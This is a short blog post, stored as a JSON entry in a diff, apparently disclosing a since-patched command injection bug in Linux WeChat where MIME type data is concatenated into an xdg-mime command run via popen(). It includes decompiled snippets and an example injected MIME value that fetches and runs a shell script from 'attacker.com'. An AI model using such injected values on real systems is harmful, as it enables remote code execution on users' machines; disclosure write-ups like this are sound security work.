@@ -1,0 +1,10 @@
+{
+  "title": "Linux WeChat RCE thoughts",
+  "slug": "linux-wechat-rce-thoughts",
+  "date": "2026-02-11T13:00:25.154Z",
+  "tags": [
+    "rce"
+  ],
+  "excerpt": "",
+  "content": "# Linux WeChat RCE in xdg-mime\nclassic\n\n## how?\nThe function `FUN_063f9730` constructs a shell command by **directly concatenating** user-controlled MIME type data with the string `\"xdg-mime query default \"`. This concatenated string is then passed to `popen_exec_cmd` (FUN_063f9ee4), which executes it via `popen()`.\n#### code snippet:\n```\nFUN_063f9730, line 89:\n  FUN_036c6b54(&local_1a0, \"xdg-mime query default \", &local_188)\n  // local_188 contains MIME type from file/message metadata\n\nFUN_063f9730, line 94:\n  popen_exec_cmd(&local_1c0, &local_1a0)   // passes to popen()\n\npopen_exec_cmd (FUN_063f9ee4), line 172:\n  popen(*(byte **)(param_2 + 0x10), \"r\")    // shell execution\n```\n### potential\n\nA MIME type string like `application/pdf; curl attacker.com/shell.sh|sh #` would result in:\n```\npopen(\"xdg-mime query default application/pdf; curl attacker.com/shell.sh|sh #\", \"r\")\n```\nThe shell interprets `;` as a command separator, executing the injected payload. Good, but only for the attacker.\n\n## thoughts on this\nwell it got patched FAST i wanted to have some fun but nvm its a simple thing, not too commplicated\n\ni might get another critical soon though\n"
+}
